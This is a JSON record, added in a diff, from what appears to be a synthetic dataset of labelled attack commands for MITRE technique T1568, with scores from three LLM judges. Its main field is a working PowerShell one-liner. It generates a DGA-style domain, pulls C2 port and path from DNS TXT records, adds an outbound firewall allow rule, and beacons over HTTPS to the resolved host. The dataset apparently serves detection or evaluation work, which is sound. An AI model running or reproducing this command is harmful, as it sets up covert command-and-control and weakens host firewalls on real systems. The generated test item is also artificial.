@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('cdn{0}{1}.telemetry-cdn.com' -f (Get-Random -Min 1 -Max 9),(Get-Date -Format 'MMdd')); $txt=Resolve-DnsName $dom -Type TXT -Server '8.8.8.8' -ErrorAction SilentlyContinue; $txtstr=($txt | ForEach-Object { $_.Strings -join '' }) -join ''; $port=((Select-String -InputObject $txtstr -Pattern 'p=(\\d+)' -AllMatches).Matches.Value -replace 'p='); if(-not $port){ $port=10443 }; $path=((Select-String -InputObject $txtstr -Pattern 'path=([/\\w\\-]+)' -AllMatches).Matches.Value -replace 'path='); if([string]::IsNullOrWhiteSpace($path)){ $path='/update' }; $a=Resolve-DnsName $dom -Type A -Server '8.8.8.8' -ErrorAction SilentlyContinue; if($a){ netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('https://{0}:{1}{2}' -f $dom,$port,$path) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 6 } }",
+  "explanation": "Retrieves C2 parameters (port and path) from TXT records of a DGA domain, then opens the advertised port and connects over HTTPS using that path.",
+  "rationale_steps": [
+    "Generate a DGA domain and query TXT for dynamic configuration.",
+    "Parse the TXT payload for port and URL path.",
+    "Resolve A records and permit outbound traffic to the dynamic port.",
+    "Beacon to the constructed endpoint leveraging Host-based routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-4dcb8624",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a DGA-like domain pattern with random numbers and date components, retrieving C2 parameters from DNS TXT records, and establishing a connection to the dynamically resolved endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:52:46.094461Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, and all cmdlets and parameters are used correctly.",
+        "semantic_score": 3,
+        "semantic_justification": "The command strongly aligns with T1568 by using a DGA, dynamically resolving C2 parameters via DNS, and attempting to beacon, but the 'netsh advfirewall' command requires administrator privileges, contradicting the stated 'Privilege: None' and making the 'opens the advertised port' claim operationally implausible.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:53:05.978148Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced braces/quotes, valid parameters, and proper separators, so it should parse and run as written.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements dynamic resolution by DGA-like domain generation, TXT-based parameter retrieval, DNS A lookup, and HTTPS beaconing, though the firewall rule addition typically requires admin and may fail under the stated privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:53:25.593172Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
